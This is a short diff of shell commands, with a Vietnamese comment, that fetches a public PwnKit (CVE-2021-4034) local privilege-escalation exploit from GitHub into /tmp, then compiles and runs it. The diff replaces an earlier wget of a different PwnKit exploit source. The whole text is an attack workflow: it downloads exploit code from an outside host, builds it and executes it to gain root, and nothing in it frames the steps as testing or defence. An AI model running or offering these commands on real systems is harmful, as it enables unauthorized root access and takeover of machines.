@@ -1,1 +1,5 @@
-wget https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.c -O pwnkit.c
+cd /tmp
+curl -fsSL https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/cve-2021-4034.c -o cve4034.c
+head -n 5 cve4034.c       # kiểm tra có "int main(...)"
+gcc cve4034.c -o cve4034
+./cve4034
